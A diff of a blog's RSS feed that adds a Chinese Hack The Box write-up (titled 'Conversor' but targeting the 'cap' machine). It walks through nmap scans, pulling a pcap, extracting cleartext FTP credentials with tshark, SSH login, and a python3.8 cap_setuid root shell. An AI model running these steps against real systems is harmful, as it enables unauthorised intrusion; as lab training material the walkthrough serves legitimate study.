@@ -1,4 +1,235 @@
-<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Posts on Welcome My Hack's Blog</title><link>https://enilmalus.github.io/posts/</link><description>Recent content in Posts on Welcome My Hack's Blog</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Wed, 28 Jan 2026 16:20:00 +0800</lastBuildDate><atom:link href="https://enilmalus.github.io/posts/index.xml" rel="self" type="application/rss+xml"/><item><title>网络安全最新资讯获取合集</title><link>https://enilmalus.github.io/posts/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%9C%80%E6%96%B0%E8%B5%84%E8%AE%AF%E8%8E%B7%E5%8F%96%E5%90%88%E9%9B%86/</link><pubDate>Wed, 28 Jan 2026 16:20:00 +0800</pubDate><guid>https://enilmalus.github.io/posts/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%9C%80%E6%96%B0%E8%B5%84%E8%AE%AF%E8%8E%B7%E5%8F%96%E5%90%88%E9%9B%86/</guid><description>&lt;h2 id="平台"&gt;平台&lt;/h2&gt;
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Posts on Welcome My Hack's Blog</title><link>https://enilmalus.github.io/posts/</link><description>Recent content in Posts on Welcome My Hack's Blog</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Sun, 08 Feb 2026 20:00:00 +0800</lastBuildDate><atom:link href="https://enilmalus.github.io/posts/index.xml" rel="self" type="application/rss+xml"/><item><title>HTB-Conversor Writeup</title><link>https://enilmalus.github.io/posts/htb-cap-writeup/</link><pubDate>Sun, 08 Feb 2026 20:00:00 +0800</pubDate><guid>https://enilmalus.github.io/posts/htb-cap-writeup/</guid><description>&lt;blockquote&gt;
+&lt;p&gt;本文章以 kali 地址为 10.10.17.128 做演示&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h2 id="初始侦察"&gt;初始侦察&lt;/h2&gt;
+&lt;h3 id="nmap-端口扫描"&gt;nmap 端口扫描&lt;/h3&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;┌──&lt;span style="color:#f92672"&gt;(&lt;/span&gt;kali㉿kali&lt;span style="color:#f92672"&gt;)&lt;/span&gt;-&lt;span style="color:#f92672"&gt;[&lt;/span&gt;~/Work/Kali&lt;span style="color:#f92672"&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;└─$ sudo nmap --min-rate &lt;span style="color:#ae81ff"&gt;10000&lt;/span&gt; -p- 10.129.11.242
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;[&lt;/span&gt;sudo&lt;span style="color:#f92672"&gt;]&lt;/span&gt; password &lt;span style="color:#66d9ef"&gt;for&lt;/span&gt; kali:
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;Starting Nmap 7.95 &lt;span style="color:#f92672"&gt;(&lt;/span&gt; https://nmap.org &lt;span style="color:#f92672"&gt;)&lt;/span&gt; at 2026-02-08 06:16 EST
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;Warning: 10.129.11.242 giving up on port because retransmission cap hit &lt;span style="color:#f92672"&gt;(&lt;/span&gt;10&lt;span style="color:#f92672"&gt;)&lt;/span&gt;.
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;Nmap scan report &lt;span style="color:#66d9ef"&gt;for&lt;/span&gt; 10.129.11.242
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;Host is up &lt;span style="color:#f92672"&gt;(&lt;/span&gt;0.15s latency&lt;span style="color:#f92672"&gt;)&lt;/span&gt;.
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;Not shown: &lt;span style="color:#ae81ff"&gt;65532&lt;/span&gt; closed tcp ports &lt;span style="color:#f92672"&gt;(&lt;/span&gt;reset&lt;span style="color:#f92672"&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;PORT STATE SERVICE
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;21/tcp open ftp
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;22/tcp open ssh
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;80/tcp open http
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;Nmap &lt;span style="color:#66d9ef"&gt;done&lt;/span&gt;: &lt;span style="color:#ae81ff"&gt;1&lt;/span&gt; IP address &lt;span style="color:#f92672"&gt;(&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;1&lt;/span&gt; host up&lt;span style="color:#f92672"&gt;)&lt;/span&gt; scanned in 16.74 seconds
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;开放了三个 TCP 端口 21、22 和 80。&lt;/p&gt;</description><content type="html"><![CDATA[<blockquote>
+<p>本文章以 kali 地址为 10.10.17.128 做演示</p>
+</blockquote>
+<h2 id="初始侦察">初始侦察</h2>
+<h3 id="nmap-端口扫描">nmap 端口扫描</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ sudo nmap --min-rate <span style="color:#ae81ff">10000</span> -p- 10.129.11.242               
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>sudo<span style="color:#f92672">]</span> password <span style="color:#66d9ef">for</span> kali: 
+</span></span><span style="display:flex;"><span>Starting Nmap 7.95 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2026-02-08 06:16 EST
+</span></span><span style="display:flex;"><span>Warning: 10.129.11.242 giving up on port because retransmission cap hit <span style="color:#f92672">(</span>10<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.129.11.242
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.15s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">65532</span> closed tcp ports <span style="color:#f92672">(</span>reset<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>PORT   STATE SERVICE
+</span></span><span style="display:flex;"><span>21/tcp open  ftp
+</span></span><span style="display:flex;"><span>22/tcp open  ssh
+</span></span><span style="display:flex;"><span>80/tcp open  http
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 16.74 seconds
+</span></span></code></pre></div><p>开放了三个 TCP 端口 21、22 和 80。</p>
+<h3 id="nmap-详细信息扫描">nmap 详细信息扫描</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ sudo nmap -sT -sC -sV -O -p21,22,80 10.129.11.242                                 
+</span></span><span style="display:flex;"><span>Starting Nmap 7.95 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2026-02-08 06:17 EST
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.129.11.242
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.086s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PORT   STATE    SERVICE VERSION
+</span></span><span style="display:flex;"><span>21/tcp filtered ftp
+</span></span><span style="display:flex;"><span>22/tcp open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ssh-hostkey: 
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">3072</span> fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>80/tcp open     http    Gunicorn
+</span></span><span style="display:flex;"><span>|_http-server-header: gunicorn
+</span></span><span style="display:flex;"><span>|_http-title: Security Dashboard
+</span></span><span style="display:flex;"><span>Warning: OSScan results may be unreliable because we could not find at least <span style="color:#ae81ff">1</span> open and <span style="color:#ae81ff">1</span> closed port
+</span></span><span style="display:flex;"><span>Device type: general purpose
+</span></span><span style="display:flex;"><span>Running: Linux 4.X|5.X
+</span></span><span style="display:flex;"><span>OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+</span></span><span style="display:flex;"><span>OS details: Linux 4.15 - 5.19
+</span></span><span style="display:flex;"><span>Network Distance: <span style="color:#ae81ff">2</span> hops
+</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 14.25 seconds
+</span></span></code></pre></div><h2 id="ftp-渗透">FTP 渗透</h2>
+<p>靶机开放 ftp 服务，尝试使用 anonymous 进行登入。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ ftp 10.129.11.242  
+</span></span><span style="display:flex;"><span>Connected to 10.129.11.242.
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">220</span> <span style="color:#f92672">(</span>vsFTPd 3.0.3<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Name <span style="color:#f92672">(</span>10.129.11.242:kali<span style="color:#f92672">)</span>: anonymous
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">331</span> Please specify the password.
+</span></span><span style="display:flex;"><span>Password: 
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">530</span> Login incorrect.
+</span></span><span style="display:flex;"><span>ftp: Login failed
+</span></span><span style="display:flex;"><span>ftp&gt; 
+</span></span></code></pre></div><p>登入失败，接下来进行 80 端口 Web 渗透看看能不能获取些信息。</p>
+<h2 id="web-渗透">Web 渗透</h2>
+<p>80 端口是一个 wordpress 的 Dashboard 界面，使用的主题是 Colorlib。</p>
+<p><img src="Pasted%20image%2020260208201108.png" alt=""></p>
+<p>进入 Security Snapshot 界面发现可以下载 cap流量包，且地址处的 data 后数字每次访问都会改变。</p>
+<p><img src="Pasted%20image%2020260208201409.png" alt=""></p>
+<p>猜测 data/0 会有有价值的数据，下载到 kali 中进行分析。</p>
+<h3 id="流量包分析">流量包分析</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ ls
+</span></span><span style="display:flex;"><span>0.pcap
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ tshark -r 0.pcap -V | grep <span style="color:#e6db74">&#39;ftp&#39;</span>                                  
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">[</span>Protocols in frame: sll:ethertype:ip:tcp:ftp<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">[</span>Protocols in frame: sll:ethertype:ip:tcp:ftp<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">[</span>Protocols in frame: sll:ethertype:ip:tcp:ftp<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">[</span>Protocols in frame: sll:ethertype:ip:tcp:ftp<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">[</span>Protocols in frame: sll:ethertype:ip:tcp:ftp<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">[</span>Protocols in frame: sll:ethertype:ip:tcp:ftp<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">[</span>Protocols in frame: sll:ethertype:ip:tcp:ftp<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">[</span>Protocols in frame: sll:ethertype:ip:tcp:ftp<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">[</span>Protocols in frame: sll:ethertype:ip:tcp:ftp<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">[</span>Protocols in frame: sll:ethertype:ip:tcp:ftp<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">[</span>Protocols in frame: sll:ethertype:ip:tcp:ftp<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">[</span>Protocols in frame: sll:ethertype:ip:tcp:ftp<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">[</span>Protocols in frame: sll:ethertype:ip:tcp:ftp<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">[</span>Protocols in frame: sll:ethertype:ip:tcp:ftp<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">[</span>Protocols in frame: sll:ethertype:ip:tcp:ftp<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">[</span>Protocols in frame: sll:ethertype:ip:tcp:ftp<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">[</span>Protocols in frame: sll:ethertype:ip:tcp:ftp<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">[</span>Protocols in frame: sll:ethertype:ip:tcp:ftp<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">[</span>Protocols in frame: sll:ethertype:ip:tcp:ftp<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">[</span>Protocols in frame: sll:ethertype:ip:tcp:ftp<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">[</span>Protocols in frame: sll:ethertype:ip:tcp:ftp<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">[</span>Protocols in frame: sll:ethertype:ip:tcp:ftp<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">[</span>Protocols in frame: sll:ethertype:ip:tcp:ftp<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">[</span>Protocols in frame: sll:ethertype:ip:tcp:ftp<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">[</span>Protocols in frame: sll:ethertype:ip:tcp:ftp<span style="color:#f92672">]</span>
+</span></span></code></pre></div><p>发现流量包包含 ftp 的内容，进行更详细的提取。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ tshark -r 0.pcap -Y <span style="color:#e6db74">&#34;ftp.request.command&#34;</span> -T fields -e ftp.request.command -e ftp.request.arg
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>USER    nathan
+</span></span><span style="display:flex;"><span>PASS    Buck3tH4TF0RM3!
+</span></span><span style="display:flex;"><span>SYST
+</span></span><span style="display:flex;"><span>PORT    192,168,196,1,212,140
+</span></span><span style="display:flex;"><span>LIST
+</span></span><span style="display:flex;"><span>PORT    192,168,196,1,212,141
+</span></span><span style="display:flex;"><span>LIST    -al
+</span></span><span style="display:flex;"><span>TYPE    I
+</span></span><span style="display:flex;"><span>PORT    192,168,196,1,212,143
+</span></span><span style="display:flex;"><span>RETR    notes.txt
+</span></span><span style="display:flex;"><span>QUIT
+</span></span></code></pre></div><p>发现 nathan 的账号密码，尝试 ssh。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ ssh nathan@10.129.11.242
+</span></span><span style="display:flex;"><span>nathan@10.129.11.242<span style="color:#960050;background-color:#1e0010">&#39;</span>s password: 
+</span></span><span style="display:flex;"><span>Welcome to Ubuntu 20.04.2 LTS <span style="color:#f92672">(</span>GNU/Linux 5.4.0-80-generic x86_64<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> * Documentation:  https://help.ubuntu.com
+</span></span><span style="display:flex;"><span> * Management:     https://landscape.canonical.com
+</span></span><span style="display:flex;"><span> * Support:        https://ubuntu.com/advantage
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  System information as of Sun Feb  <span style="color:#ae81ff">8</span> 12:20:22 UTC <span style="color:#ae81ff">2026</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  System load:           0.0
+</span></span><span style="display:flex;"><span>  Usage of /:            36.7% of 8.73GB
+</span></span><span style="display:flex;"><span>  Memory usage:          34%
+</span></span><span style="display:flex;"><span>  Swap usage:            0%
+</span></span><span style="display:flex;"><span>  Processes:             <span style="color:#ae81ff">226</span>
+</span></span><span style="display:flex;"><span>  Users logged in:       <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>  IPv4 address <span style="color:#66d9ef">for</span> eth0: 10.129.11.242
+</span></span><span style="display:flex;"><span>  IPv6 address <span style="color:#66d9ef">for</span> eth0: dead:beef::250:56ff:feb9:883c
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">=</span>&gt; There are <span style="color:#ae81ff">4</span> zombie processes.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">63</span> updates can be applied immediately.
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">42</span> of these updates are standard security updates.
+</span></span><span style="display:flex;"><span>To see these additional updates run: apt list --upgradable
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>The list of available updates is more than a week old.
+</span></span><span style="display:flex;"><span>To check <span style="color:#66d9ef">for</span> new updates run: sudo apt update
+</span></span><span style="display:flex;"><span>Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Last login: Sun Feb  <span style="color:#ae81ff">8</span> 11:38:54 <span style="color:#ae81ff">2026</span> from 10.10.17.128
+</span></span><span style="display:flex;"><span>nathan@cap:~$ whoami
+</span></span><span style="display:flex;"><span>nathan
+</span></span></code></pre></div><h2 id="linux-提权">Linux 提权</h2>
+<p>进行 sudo 枚举和 suid 枚举未发现可能提权的途径。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nathan@cap:~$ sudo -l
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>sudo<span style="color:#f92672">]</span> password <span style="color:#66d9ef">for</span> nathan: 
+</span></span><span style="display:flex;"><span>Sorry, try again.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>sudo<span style="color:#f92672">]</span> password <span style="color:#66d9ef">for</span> nathan: 
+</span></span><span style="display:flex;"><span>Sorry, user nathan may not run sudo on cap.
+</span></span><span style="display:flex;"><span>nathan@cap:~$ find / -perm -u<span style="color:#f92672">=</span>s -type f 2&gt;/dev/null
+</span></span><span style="display:flex;"><span>/usr/bin/umount
+</span></span><span style="display:flex;"><span>/usr/bin/newgrp
+</span></span><span style="display:flex;"><span>/usr/bin/pkexec
+</span></span><span style="display:flex;"><span>/usr/bin/mount
+</span></span><span style="display:flex;"><span>/usr/bin/gpasswd
+</span></span><span style="display:flex;"><span>/usr/bin/passwd
+</span></span><span style="display:flex;"><span>/usr/bin/chfn
+</span></span><span style="display:flex;"><span>/usr/bin/sudo
+</span></span><span style="display:flex;"><span>/usr/bin/at
+</span></span><span style="display:flex;"><span>/usr/bin/chsh
+</span></span><span style="display:flex;"><span>/usr/bin/su
+</span></span><span style="display:flex;"><span>/usr/bin/fusermount
+</span></span><span style="display:flex;"><span>/usr/lib/policykit-1/polkit-agent-helper-1
+</span></span><span style="display:flex;"><span>/usr/lib/snapd/snap-confine
+</span></span><span style="display:flex;"><span>/usr/lib/openssh/ssh-keysign
+</span></span><span style="display:flex;"><span>/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+</span></span><span style="display:flex;"><span>/usr/lib/eject/dmcrypt-get-device
+</span></span><span style="display:flex;"><span>/snap/snapd/11841/usr/lib/snapd/snap-confine
+</span></span><span style="display:flex;"><span>/snap/snapd/12398/usr/lib/snapd/snap-confine
+</span></span><span style="display:flex;"><span>/snap/core18/2066/bin/mount
+</span></span><span style="display:flex;"><span>/snap/core18/2066/bin/ping
+</span></span><span style="display:flex;"><span>/snap/core18/2066/bin/su
+</span></span><span style="display:flex;"><span>/snap/core18/2066/bin/umount
+</span></span><span style="display:flex;"><span>/snap/core18/2066/usr/bin/chfn
+</span></span><span style="display:flex;"><span>/snap/core18/2066/usr/bin/chsh
+</span></span><span style="display:flex;"><span>/snap/core18/2066/usr/bin/gpasswd
+</span></span><span style="display:flex;"><span>/snap/core18/2066/usr/bin/newgrp
+</span></span><span style="display:flex;"><span>/snap/core18/2066/usr/bin/passwd
+</span></span><span style="display:flex;"><span>/snap/core18/2066/usr/bin/sudo
+</span></span><span style="display:flex;"><span>/snap/core18/2066/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+</span></span><span style="display:flex;"><span>/snap/core18/2066/usr/lib/openssh/ssh-keysign
+</span></span><span style="display:flex;"><span>/snap/core18/2074/bin/mount
+</span></span><span style="display:flex;"><span>/snap/core18/2074/bin/ping
+</span></span><span style="display:flex;"><span>/snap/core18/2074/bin/su
+</span></span><span style="display:flex;"><span>/snap/core18/2074/bin/umount
+</span></span><span style="display:flex;"><span>/snap/core18/2074/usr/bin/chfn
+</span></span><span style="display:flex;"><span>/snap/core18/2074/usr/bin/chsh
+</span></span><span style="display:flex;"><span>/snap/core18/2074/usr/bin/gpasswd
+</span></span><span style="display:flex;"><span>/snap/core18/2074/usr/bin/newgrp
+</span></span><span style="display:flex;"><span>/snap/core18/2074/usr/bin/passwd
+</span></span><span style="display:flex;"><span>/snap/core18/2074/usr/bin/sudo
+</span></span><span style="display:flex;"><span>/snap/core18/2074/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+</span></span><span style="display:flex;"><span>/snap/core18/2074/usr/lib/openssh/ssh-keysign
+</span></span></code></pre></div><p>枚举发现 python3.8 可以 setuid。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nathan@cap:~$ getcap -r / 2&gt;/dev/null
+</span></span><span style="display:flex;"><span>/usr/bin/python3.8 <span style="color:#f92672">=</span> cap_setuid,cap_net_bind_service+eip
+</span></span><span style="display:flex;"><span>/usr/bin/ping <span style="color:#f92672">=</span> cap_net_raw+ep
+</span></span><span style="display:flex;"><span>/usr/bin/traceroute6.iputils <span style="color:#f92672">=</span> cap_net_raw+ep
+</span></span><span style="display:flex;"><span>/usr/bin/mtr-packet <span style="color:#f92672">=</span> cap_net_raw+ep
+</span></span><span style="display:flex;"><span>/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper <span style="color:#f92672">=</span> cap_net_bind_service,cap_net_admin+ep
+</span></span></code></pre></div><p>使用 python 实现提权。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nathan@cap:~$ /usr/bin/python3.8 -c <span style="color:#e6db74">&#39;import os; os.setuid(0); os.system(&#34;/bin/bash&#34;)&#39;</span>
+</span></span><span style="display:flex;"><span>root@cap:~# whoami
+</span></span><span style="display:flex;"><span>root
+</span></span></code></pre></div>]]></content></item><item><title>网络安全最新资讯获取合集</title><link>https://enilmalus.github.io/posts/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%9C%80%E6%96%B0%E8%B5%84%E8%AE%AF%E8%8E%B7%E5%8F%96%E5%90%88%E9%9B%86/</link><pubDate>Wed, 28 Jan 2026 16:20:00 +0800</pubDate><guid>https://enilmalus.github.io/posts/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%9C%80%E6%96%B0%E8%B5%84%E8%AE%AF%E8%8E%B7%E5%8F%96%E5%90%88%E9%9B%86/</guid><description>&lt;h2 id="平台"&gt;平台&lt;/h2&gt;
 &lt;p&gt;&lt;a href="https://thehackernews.com/"&gt;The Hacker News&lt;/a&gt;：全球排名第一的网络安全新闻平台&lt;/p&gt;
 &lt;p&gt;&lt;a href="https://www.securityweek.com/"&gt;SecurityWeek&lt;/a&gt;：企业安全新闻&lt;/p&gt;
 &lt;p&gt;&lt;a href="https://www.darkreading.com/"&gt;Dark reading&lt;/a&gt;：博客&lt;/p&gt;
